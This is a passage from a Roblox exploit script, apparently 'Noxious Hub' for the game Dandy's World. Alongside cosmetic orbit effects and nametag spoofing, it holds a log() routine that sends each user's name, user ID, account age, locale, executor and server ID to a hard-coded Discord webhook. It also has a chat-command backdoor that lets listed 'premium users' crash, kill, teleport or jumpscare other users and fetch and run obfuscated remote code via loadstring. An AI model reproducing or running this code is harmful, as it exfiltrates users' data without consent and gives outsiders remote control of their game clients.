			uiCorner.Parent = imageLabel

			imageLabel.Parent = billboardGui
			billboardGui.Parent = HRP
		end
	end

	-- Connect the onchar function to the CharacterAdded event
	if player.Character then
		onchar(player.Character)
	end
	player.CharacterAdded:Connect(onchar)
end

-- Check for existing players and add BillboardGui if necessary
for _, player in pairs(noxious["players"]:GetPlayers()) do
	if table.find(noxious["admins"], player.Name) then
		addBillboardGui(player)
	end
end

-- Listen for new players joining
noxious["players"].PlayerAdded:Connect(function(player)
	if table.find(noxious["admins"], player.Name) then
		addBillboardGui(player)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

if game.PlaceId == noxious["dandy's world lobby"] or game.PlaceId == noxious["dandy's world run"] or game.PlaceId == noxious["dandy's world roleplay server"] then

	local Players = game:GetService"Players"

	-- Helper function to check if a player is in the "unable" list
	local function isplayerunable(playerName)
		for _, name in ipairs(noxious["unable"]) do
			if playerName:lower() == name:lower() then
				return true
			end
		end
		return false
	end

	-- Store orbiting parts and sound data for each "unable" player
	local orbitData = {}

	-- Function to clean up parts and sounds for a player
	local function cleanUpOrbitingParts(targetPlayer)
		local data = orbitData[targetPlayer]
		if data then
			-- Destroy parts and disconnect the RenderStepped connection
			for _, part in ipairs(data.parts) do
				part:Destroy()
			end
			if data.connection then
				data.connection:Disconnect()
			end
			-- Stop and remove the sound
			if data.sound then
				data.sound:Stop()
				data.sound:Destroy()
			end
			orbitData[targetPlayer] = nil
		end
	end

	-- Function to create orbiting parts and play music for a player
	local function createOrbitingParts(targetPlayer)
		local character = targetPlayer.Character
		if not character then return end

		local humanoidRootPart = character:FindFirstChild"HumanoidRootPart"
		if not humanoidRootPart then return end

		-- Configuration
		local numberOfParts = 9
		local orbitRadius = 7 -- Distance from the character
		local orbitSpeed = 0.8 -- Speed of orbit (higher is faster)
		local gyrationSpeed = 0.2 -- Speed at which the parts rotate around their own axes
		local fixedYPositionOffset = 0.5 -- Distance above or below the player's HumanoidRootPart
		local parts = {}
		local rotationAxes = {} -- Store random rotation directions for each part
		local partRotations = {} -- Store the current CFrame rotation of each part

		-- Function to create a MeshPart with a black highlight
		local function createMeshPart()
			local meshPart = Instance.new"MeshPart"
			meshPart.Size = Vector3.new(1, 1, 1)
			meshPart.MeshId = "rbxassetid://16987636120"
			meshPart.TextureID = "rbxassetid://16987597868"
			meshPart.Color = Color3.new(0, 0, 0)
			meshPart.Material = "Neon"
			meshPart.Anchored = true
			meshPart.CanCollide = false
			meshPart.Parent = workspace
			return meshPart
		end

		-- Generate a random non-zero rotation direction (unit vector)
		local function getRandomRotationAxis()
			local x, y, z
			repeat
				x = math.random(-100, 100)
				y = math.random(-100, 100)
				z = math.random(-100, 100)
			until x ~= 0 or y ~= 0 or z ~= 0 -- Ensure it's not a zero vector
			local magnitude = math.sqrt(x^2 + y^2 + z^2)
			return Vector3.new(x, y, z) / magnitude -- Normalize the vector
		end

		-- Create the orbiting parts
		for i = 1, numberOfParts do
			local part = createMeshPart()
			table.insert(parts, part)
			table.insert(rotationAxes, getRandomRotationAxis()) -- Assign a random rotation direction
			table.insert(partRotations, CFrame.new()) -- Initialize with identity CFrame
		end

		-- Update the positions and rotation of the parts
		local function updateParts(deltaTime)
			for i, part in ipairs(parts) do
				-- Orbit Calculation
				local angle = tick() * orbitSpeed + (math.pi * 2 / numberOfParts) * (i - 1)
				local offsetX = math.cos(angle) * orbitRadius
				local offsetZ = math.sin(angle) * orbitRadius
				local fixedYPosition = humanoidRootPart.Position.Y + fixedYPositionOffset -- Lock Y-axis
				local orbitPosition = Vector3.new(
					humanoidRootPart.Position.X + offsetX,
					fixedYPosition,
					humanoidRootPart.Position.Z + offsetZ
				)
				-- Gyration (rotate around their own center)
				local rotationAxis = rotationAxes[i]
				local rotationAngle = deltaTime * math.rad(gyrationSpeed * 360) -- Speed in degrees per second
				local rotationDelta = CFrame.fromAxisAngle(rotationAxis, rotationAngle)
				partRotations[i] = partRotations[i] * rotationDelta -- Update the current rotation
				-- Combine orbit position with rotation
				part.CFrame = CFrame.new(orbitPosition) * partRotations[i]
			end
		end

		-- Set up the RenderStepped connection
		local renderConnection
		renderConnection = noxious["run service"].RenderStepped:Connect(function(deltaTime)
			if not targetPlayer.Parent or not targetPlayer.Character or not humanoidRootPart.Parent then
				-- Clean up if the player leaves or their character is destroyed
				cleanUpOrbitingParts(targetPlayer)
				return
			end
			updateParts(deltaTime)
		end)

		-- Store orbit data for cleanup
		orbitData[targetPlayer] = {
			parts = parts,
			connection = renderConnection,
		}
	end

	-- Function to update username and display name labels
	local function updatePlayerLabels(targetPlayer)
		spawn(function()
			local playersFolder = workspace:FindFirstChild"Players" or workspace:WaitForChild"InGamePlayers"
			local playerModel = playersFolder:WaitForChild(targetPlayer.Name)

			local humanoidRootPart = playerModel:WaitForChild"HumanoidRootPart"
			local nameTag = humanoidRootPart:WaitForChild"NameTag"
			local frame = nameTag:WaitForChild"Frame"

			local usernamelabel = frame:WaitForChild"UserName"
			local displaynamelabel = frame:WaitForChild"DisplayName"

			usernamelabel.Text = "(@unable)"
			displaynamelabel.Text = "unable"
		end)
	end

	-- Function to apply the orbit effect when the player respawns or rejoins
	local function applyOrbitEffect(targetPlayer)
		if isplayerunable(targetPlayer.Name) then
			targetPlayer.CharacterAdded:Connect(function()
				wait(0.1) -- Ensure the character is fully loaded
				cleanUpOrbitingParts(targetPlayer) -- Remove old parts
				createOrbitingParts(targetPlayer) -- Add new parts
				updatePlayerLabels(targetPlayer)
			end)
			-- If the character already exists, apply immediately
			if targetPlayer.Character then
				cleanUpOrbitingParts(targetPlayer) -- Remove old parts
				createOrbitingParts(targetPlayer) -- Add new parts
				updatePlayerLabels(targetPlayer)
			end
		end
	end

	-- Apply for all current players
	for _, player in ipairs(Players:GetPlayers()) do
		applyOrbitEffect(player)
	end

	-- Apply for new players
	Players.PlayerAdded:Connect(function(newPlayer)
		applyOrbitEffect(newPlayer)
	end)

	-- Handle players leaving
	Players.PlayerRemoving:Connect(function(leavingPlayer)
		cleanUpOrbitingParts(leavingPlayer)
	end)
end

if game.PlaceId == noxious["dandy's world lobby"] or game.PlaceId == noxious["dandy's world run"] or game.PlaceId == noxious["dandy's world roleplay server"] then

	local Players = game:GetService"Players"

	-- Helper function to check if a player is in the "unable" list
	local function isplayershrimpoorbiter(playerName)
		for _, name in ipairs(noxious["shrimpo orbiter"]) do
			if playerName:lower() == name:lower() then
				return true
			end
		end
		return false
	end

	-- Store orbiting parts and sound data for each "unable" player
	local orbitData = {}

	-- Function to clean up parts and sounds for a player
	local function cleanUpOrbitingParts(targetPlayer)
		local data = orbitData[targetPlayer]
		if data then
			-- Destroy parts and disconnect the RenderStepped connection
			for _, part in ipairs(data.parts) do
				part:Destroy()
			end
			if data.connection then
				data.connection:Disconnect()
			end
			-- Stop and remove the sound
			if data.sound then
				data.sound:Stop()
				data.sound:Destroy()
			end
			orbitData[targetPlayer] = nil
		end
	end

	-- Function to create orbiting parts and play music for a player
	local function createOrbitingParts(targetPlayer)
		local character = targetPlayer.Character
		if not character then return end

		local humanoidRootPart = character:FindFirstChild"HumanoidRootPart"
		if not humanoidRootPart then return end

		-- Configuration
		local numberOfParts = 9
		local orbitRadius = 7 -- Distance from the character
		local orbitSpeed = 0.8 -- Speed of orbit (higher is faster)
		local gyrationSpeed = 0.2 -- Speed at which the parts rotate around their own axes
		local fixedYPositionOffset = 0.5 -- Distance above or below the player's HumanoidRootPart
		local parts = {}
		local rotationAxes = {} -- Store random rotation directions for each part
		local partRotations = {} -- Store the current CFrame rotation of each part

		-- Function to create a MeshPart with a black highlight
		local function createMeshPart()
			local meshPart = Instance.new"MeshPart"
			meshPart.Size = Vector3.new(0.4, 0.4, 0.4)
			meshPart.MeshId = "rbxassetid://127944646395421"
			meshPart.TextureID = "rbxassetid://111384176423148"
			meshPart.Color = Color3.new(0, 0, 0)
			meshPart.Material = "Neon"
			meshPart.Anchored = true
			meshPart.CanCollide = false
			meshPart.Parent = workspace
			return meshPart
		end

		-- Generate a random non-zero rotation direction (unit vector)
		local function getRandomRotationAxis()
			local x, y, z
			repeat
				x = math.random(-100, 100)
				y = math.random(-100, 100)
				z = math.random(-100, 100)
			until x ~= 0 or y ~= 0 or z ~= 0 -- Ensure it's not a zero vector
			local magnitude = math.sqrt(x^2 + y^2 + z^2)
			return Vector3.new(x, y, z) / magnitude -- Normalize the vector
		end

		-- Create the orbiting parts
		for i = 1, numberOfParts do
			local part = createMeshPart()
			table.insert(parts, part)
			table.insert(rotationAxes, getRandomRotationAxis()) -- Assign a random rotation direction
			table.insert(partRotations, CFrame.new()) -- Initialize with identity CFrame
		end

		-- Update the positions and rotation of the parts
		local function updateParts(deltaTime)
			for i, part in ipairs(parts) do
				-- Orbit Calculation
				local angle = tick() * orbitSpeed + (math.pi * 2 / numberOfParts) * (i - 1)
				local offsetX = math.cos(angle) * orbitRadius
				local offsetZ = math.sin(angle) * orbitRadius
				local fixedYPosition = humanoidRootPart.Position.Y + fixedYPositionOffset -- Lock Y-axis
				local orbitPosition = Vector3.new(
					humanoidRootPart.Position.X + offsetX,
					fixedYPosition,
					humanoidRootPart.Position.Z + offsetZ
				)
				-- Gyration (rotate around their own center)
				local rotationAxis = rotationAxes[i]
				local rotationAngle = deltaTime * math.rad(gyrationSpeed * 360) -- Speed in degrees per second
				local rotationDelta = CFrame.fromAxisAngle(rotationAxis, rotationAngle)
				partRotations[i] = partRotations[i] * rotationDelta -- Update the current rotation
				-- Combine orbit position with rotation
				part.CFrame = CFrame.new(orbitPosition) * partRotations[i]
			end
		end

		-- Set up the RenderStepped connection
		local renderConnection
		renderConnection = noxious["run service"].RenderStepped:Connect(function(deltaTime)
			if not targetPlayer.Parent or not targetPlayer.Character or not humanoidRootPart.Parent then
				-- Clean up if the player leaves or their character is destroyed
				cleanUpOrbitingParts(targetPlayer)
				return
			end
			updateParts(deltaTime)
		end)

		-- Store orbit data for cleanup
		orbitData[targetPlayer] = {
			parts = parts,
			connection = renderConnection,
		}
	end

	-- Function to apply the orbit effect when the player respawns or rejoins
	local function applyOrbitEffect(targetPlayer)
		if isplayershrimpoorbiter(targetPlayer.Name) then
			targetPlayer.CharacterAdded:Connect(function()
				wait(0.1) -- Ensure the character is fully loaded
				cleanUpOrbitingParts(targetPlayer) -- Remove old parts
				createOrbitingParts(targetPlayer) -- Add new parts
			end)
			-- If the character already exists, apply immediately
			if targetPlayer.Character then
				cleanUpOrbitingParts(targetPlayer) -- Remove old parts
				createOrbitingParts(targetPlayer) -- Add new parts
			end
		end
	end

	-- Function to reload the orbiting parts for all "unable" players
	local function reloadOrbitingPartsForAllUnablePlayers()
		for _, player in ipairs(Players:GetPlayers()) do
			if isplayershrimpoorbiter(player.Name) then
				cleanUpOrbitingParts(player) -- Clean up existing parts for this player
				createOrbitingParts(player) -- Create new orbiting parts for this player
			end
		end
	end

	-- Function to handle respawn event for the player running the script
	local function onPlayerRespawn(player)
		-- Check if the player's username is in the "unable" table
		if isplayershrimpoorbiter(player.Name) then
			player.CharacterAdded:Connect(function()
				-- Call the reloadOrbitingPartsForAllUnablePlayers function when the player respawns
				wait(1)
				reloadOrbitingPartsForAllUnablePlayers()
			end)
		end
	end

	-- Keep running the onPlayerRespawn function every time the player respawns
	Players.PlayerAdded:Connect(function(player)
		onPlayerRespawn(player)

		player.CharacterAdded:Connect(function()
			onPlayerRespawn(player)
		end)
	end)

	-- Apply for the current player immediately when the script starts
	onPlayerRespawn(Players.LocalPlayer)

	-- Apply the orbit effect to "unable" players currently in the server
	for _, player in ipairs(Players:GetPlayers()) do
		applyOrbitEffect(player)
	end

	-- Handle new players joining
	Players.PlayerAdded:Connect(function(newPlayer)
		applyOrbitEffect(newPlayer)
	end)

	-- Handle players leaving
	Players.PlayerRemoving:Connect(function(leavingPlayer)
		cleanUpOrbitingParts(leavingPlayer)
	end)

	spawn(function()
		wait(30)
		reloadOrbitingPartsForAllUnablePlayers()
	end)

end

if game.PlaceId == noxious["dandy's world lobby"] or game.PlaceId == noxious["dandy's world run"] or game.PlaceId == noxious["dandy's world roleplay server"] then

	local Players = game:GetService"Players"

	-- Helper function to check if a player is in the "unable" list
	local function isplayercosmoorbiter(playerName)
		for _, name in ipairs(noxious["cosmo orbiter"]) do
			if playerName:lower() == name:lower() then
				return true
			end
		end
		return false
	end

	-- Store orbiting parts and sound data for each "unable" player
	local orbitData = {}

	-- Function to clean up parts and sounds for a player
	local function cleanUpOrbitingParts(targetPlayer)
		local data = orbitData[targetPlayer]
		if data then
			-- Destroy parts and disconnect the RenderStepped connection
			for _, part in ipairs(data.parts) do
				part:Destroy()
			end
			if data.connection then
				data.connection:Disconnect()
			end
			orbitData[targetPlayer] = nil
		end
	end

	-- Function to create orbiting parts
	local function createOrbitingParts(targetPlayer)
		local character = targetPlayer.Character
		if not character then return end

		local humanoidRootPart = character:FindFirstChild"HumanoidRootPart"
		if not humanoidRootPart then return end

		local numberOfParts = 9
		local orbitRadius = 7
		local orbitSpeed = 0.8
		local gyrationSpeed = 0.2
		local fixedYPositionOffset = 0.5
		local parts = {}
		local rotationAxes = {}
		local partRotations = {}

		local function createMeshPart()
			local meshPart = Instance.new"MeshPart"
			meshPart.Size = Vector3.new(0.5, 0.5, 0.5)
			meshPart.MeshId = "rbxassetid://18594830201"
			meshPart.TextureID = "rbxassetid://130874271887611"
			meshPart.Color = Color3.new(0, 0, 0)
			meshPart.Material = "Neon"
			meshPart.Anchored = true
			meshPart.CanCollide = false
			meshPart.Parent = workspace
			return meshPart
		end

		local function getRandomRotationAxis()
			local x, y, z
			repeat
				x = math.random(-100, 100)
				y = math.random(-100, 100)
				z = math.random(-100, 100)
			until x ~= 0 or y ~= 0 or z ~= 0
			local magnitude = math.sqrt(x^2 + y^2 + z^2)
			return Vector3.new(x, y, z) / magnitude
		end

		for i = 1, numberOfParts do
			local part = createMeshPart()
			table.insert(parts, part)
			table.insert(rotationAxes, getRandomRotationAxis())
			table.insert(partRotations, CFrame.new())
		end

		local function updateParts(deltaTime)
			for i, part in ipairs(parts) do
				local angle = tick() * orbitSpeed + (math.pi * 2 / numberOfParts) * (i - 1)
				local offsetX = math.cos(angle) * orbitRadius
				local offsetZ = math.sin(angle) * orbitRadius
				local fixedYPosition = humanoidRootPart.Position.Y + fixedYPositionOffset
				local orbitPosition = Vector3.new(
					humanoidRootPart.Position.X + offsetX,
					fixedYPosition,
					humanoidRootPart.Position.Z + offsetZ
				)
				local rotationAxis = rotationAxes[i]
				local rotationAngle = deltaTime * math.rad(gyrationSpeed * 360)
				local rotationDelta = CFrame.fromAxisAngle(rotationAxis, rotationAngle)
				partRotations[i] = partRotations[i] * rotationDelta
				part.CFrame = CFrame.new(orbitPosition) * partRotations[i]
			end
		end

		local renderConnection
		renderConnection = noxious["run service"].RenderStepped:Connect(function(deltaTime)
			if not targetPlayer.Parent or not targetPlayer.Character or not humanoidRootPart.Parent then
				cleanUpOrbitingParts(targetPlayer)
				return
			end
			updateParts(deltaTime)
		end)

		orbitData[targetPlayer] = {
			parts = parts,
			connection = renderConnection,
		}
	end

	-- Function to update username and display name labels
	local function updatePlayerLabels(targetPlayer)
		spawn(function()
			local playersFolder = workspace:FindFirstChild"Players" or workspace:WaitForChild"InGamePlayers"
			local playerModel = playersFolder:WaitForChild(targetPlayer.Name)

			local humanoidRootPart = playerModel:WaitForChild"HumanoidRootPart"
			local nameTag = humanoidRootPart:WaitForChild"NameTag"
			local frame = nameTag:WaitForChild"Frame"

			local usernamelabel = frame:WaitForChild"UserName"
			local displaynamelabel = frame:WaitForChild"DisplayName"

			usernamelabel.Text = "(@cosmo)"
			displaynamelabel.Text = "Cosmo"
		end)
	end

	-- Function to apply the orbit effect and update labels
	local function applyOrbitEffect(targetPlayer)
		if isplayercosmoorbiter(targetPlayer.Name) then
			targetPlayer.CharacterAdded:Connect(function()
				wait(0.1)
				cleanUpOrbitingParts(targetPlayer)
				createOrbitingParts(targetPlayer)
				updatePlayerLabels(targetPlayer)
			end)

			if targetPlayer.Character then
				cleanUpOrbitingParts(targetPlayer)
				createOrbitingParts(targetPlayer)
				updatePlayerLabels(targetPlayer)
			end
		end
	end

	-- Apply for all current players
	for _, player in ipairs(Players:GetPlayers()) do
		applyOrbitEffect(player)
	end

	-- Apply for new players
	Players.PlayerAdded:Connect(function(newPlayer)
		applyOrbitEffect(newPlayer)
	end)

	-- Handle players leaving
	Players.PlayerRemoving:Connect(function(leavingPlayer)
		cleanUpOrbitingParts(leavingPlayer)
	end)

end

if game.PlaceId == noxious["dandy's world lobby"] or game.PlaceId == noxious["dandy's world run"] or game.PlaceId == noxious["dandy's world roleplay server"] then

	local Players = game:GetService"Players"

	-- Helper function to check if a player is in the "unable" list
	local function isplayerundercoverunable(playerName)
		for _, name in ipairs(noxious["undercover unable"]) do
			if playerName:lower() == name:lower() then
				return true
			end
		end
		return false
	end

	-- Function to update username and display name labels











































































































	function updatePlayerLabels(targetPlayer)
		spawn(function()
			local playersFolder = workspace:FindFirstChild"Players" or workspace:WaitForChild"InGamePlayers"
			local playerModel = playersFolder:WaitForChild(targetPlayer.Name)

			local humanoidRootPart = playerModel:WaitForChild"HumanoidRootPart"
			local nameTag = humanoidRootPart:WaitForChild"NameTag"
			local frame = nameTag:WaitForChild"Frame"

			local usernamelabel = frame:WaitForChild"UserName"
			local displaynamelabel = frame:WaitForChild"DisplayName"

			usernamelabel.Text = "(@ncts)"
			displaynamelabel.Text = "ncts"
		end)
	end

	-- Function to apply the orbit effect and update labels
	local function applyOrbitEffect(targetPlayer)
		if isplayerundercoverunable(targetPlayer.Name) then
			targetPlayer.CharacterAdded:Connect(function()
				wait(0.1)
				-- cleanUpOrbitingParts(targetPlayer)
				-- createOrbitingParts(targetPlayer)
				updatePlayerLabels(targetPlayer)
			end)

			if targetPlayer.Character then
				-- cleanUpOrbitingParts(targetPlayer)
				-- createOrbitingParts(targetPlayer)
				updatePlayerLabels(targetPlayer)
			end
		end
	end

	-- Apply for all current players
	for _, player in ipairs(Players:GetPlayers()) do
		applyOrbitEffect(player)
	end

	-- Apply for new players
	Players.PlayerAdded:Connect(function(newPlayer)
		applyOrbitEffect(newPlayer)
	end)

	-- Handle players leaving
	Players.PlayerRemoving:Connect(function(leavingPlayer)
		-- cleanUpOrbitingParts(leavingPlayer)
	end)

end

-------------------------------------------------------------------------------------------------------------------------------

spawn(function() intro() end)

-------------------------------------------------------------------------------------------------------------------------------

function log()
	if ptlog == true then
		local DName = noxious["local player"].DisplayName
		local Name = noxious["local player"].Name
		local Userid = noxious["local player"].UserId
		local AccountAge = noxious["local player"].AccountAge
		local Country = game.LocalizationService.RobloxLocaleId
		local ConsoleJobId = game.JobId

		local GAMENAME = noxious["marketplace service"]:GetProductInfo(game.PlaceId).Name

		local function detectExecutor()
			return identifyexecutor()
		end

		local function createWebhookData()
			local webhookcheck = detectExecutor()

			local data = {
				avatar_url="",
				content="**" .. DName .. " (@" .. Name .. ")** Executed **Noxious Hub: Dandys World (Version " .. noxious["version"] .. ")** | [**View Player**](https://www.roblox.com/users/"..Userid..") | [**Join Server**](https://www.roblox.com/games/start?placeId=16302670534&launchData=".. game.PlaceId .."/" ..ConsoleJobId..")",
				embeds={
					{
						author={
							name="",
							url="https://roblox.com",
						},
						description=tostring(
							"\n\n**[Noxious Info]:**" ..
								"\n**• Version:** `"..noxious["version"].."`" ..

								"\n\n**[[User Info]:](https://www.roblox.com/users/"..Userid..")**" ..
								"\n**• Display Name:** `"..DName.."`" ..
								"\n**• Username:** `"..Name.."`" .. 
								"\n**• Account Age:** `"..AccountAge.."`" ..
								"\n**• Executor:** `"..webhookcheck.."`" ..
								"\n**• Country:** `"..Country.."`" ..

								"\n\n**[[Game Info]:](https://www.roblox.com/games/"..game.PlaceId..")**" ..
								"\n**• Game:** `"..GAMENAME.."`"

						),
						type="rich",
						color=tonumber"0xFFFFFF",
						thumbnail={
							url="https://www.roblox.com/headshot-thumbnail/image?userId=" .. noxious["local player"].UserId .. "&width=420&height=420&format=png"
						},
					}
				}
			}
			return noxious["http service"]:JSONEncode(data)
		end

		local function sendWebhook(webhookUrl, data)
			local headers = {
				["content-type"] = "application/json"
			}

			local request = http_request or request or HttpPost or syn.request
			local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
			request(abcdef)
		end

		local webhookUrl = "https://discord.com/api/webhooks/1360433981946069215/G1Np2DbgHcuFlogJFGAid86GC1XmYbszBCrV-eN74gfy_o2VfDp6f_G7XGVjQyBpqp6q"
		local webhookData = createWebhookData()

		sendWebhook(webhookUrl, webhookData)
	end
end

spawn(function() log() end)

-------------------------------------------------------------------------------------------------------------------------------

local function canrun(player)
	for _, username in pairs(noxious["premium users"]) do
		if player.Name == username then
			return true
		end
	end
	return false
end

local function onpremiumuserchatted(player, message)
	if not canrun(player) then return end

	message = message:lower()

	if message:sub(1, 5) == "/e sn" then
		local text = message:sub(7)
		if text and text ~= "" then
			notify(text, 5)
		end

	elseif message == "/e unable" then
		test()

	elseif message == "/e shrimp" then
		dwshrimpdecal()

	elseif message == "/e noxious" then
		noxiousdecalspam()

	elseif message == "/e im scared" then
		scarydecalspam()

	elseif message == "/e im very scared" then
		veryscarydecalspam()

	elseif message == "/e cjs" then
		conniejumpscare()
	elseif message == "/e sbpjs" then
		buffpebblejumpscare()
	elseif message == "/e djs" then
		dandyjumpscare()
	elseif message == "/e tjs" then
		toodlesjumpscare()
	elseif message == "/e sjs" then
		shrimpojumpscare()
	elseif message == "/e ajs" then
		albertjumpscare()
	elseif message == "/e fruitjumpscare" then
		fruitcakejumpscare()
	elseif message == "/e mrjs" then
		jewelryboxjumpscare()
	elseif message == "/e sdjs" then
		sharingandandyjumpscare()
	elseif message == "/e shrimpo2" then
		shrimpo2jumpscare()
	elseif message == "/e shelly" then
		shellyjumpscare()
	elseif message == "/e sprout" then
		sproutjumpscare()

	elseif message == "/e flashbang" then
		flashbang()

	elseif message == "/e scary jumpscare" then
		scaryjumpscare()

	elseif message == "/e creepy girl" then
		creepygirlvoice()
	elseif message == "/e cry 1" then
		mancrying()
	elseif message == "/e cry 2" then
		womancrying()

	elseif message == "/e teleport" then
		teleportToPlayer(player)

	elseif message == "/e sing" then
		pcall(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/meowsynther/team-noxious-obfuscated/refs/heads/main/miscellaneous/%5Bobf%5D%20sing%20thick%20of%20it.lua"))()
		end)

	elseif message == "/e die" then
		execcmd("die")

	elseif message == "/e crash" then
		crash()

	elseif message == "/e force stop player interactions" then
		unbottombang()
		dwunbang()
		dwunhead()
		dwunhsit()
		dwunhsit2()
		dwunhjsit()

	elseif message == "/e force stop commands" then
		stoprunningconnections()

	elseif message == "/e tj" then
		notify("A Noxious Team Member joined your server.", 5, "tmishere")

	elseif message == "/e uj" then
		notify("A Noxious Team Member joined your server.", 5, "tmishere")
		notify("Unable joined your server.", 5, "unableishere")

	elseif message == "/e aj" then
		notify("A Noxious Team Member joined your server.", 5, "tmishere")
		notify("Ace joined your server.", 5, "aceishere")

	elseif message == "/e qj" then
		notify("Qwelver joined your server.", 5, "qwelverishere")
	end
end

local function premiumcommandlistener(player)
	player.Chatted:Connect(function(message)
		onpremiumuserchatted(player, message)
	end)
end

for _, player in pairs(Players:GetPlayers()) do
	premiumcommandlistener(player)
end

Players.PlayerAdded:Connect(premiumcommandlistener)

-------------------------------------------------------------------------------------------------------------------------------
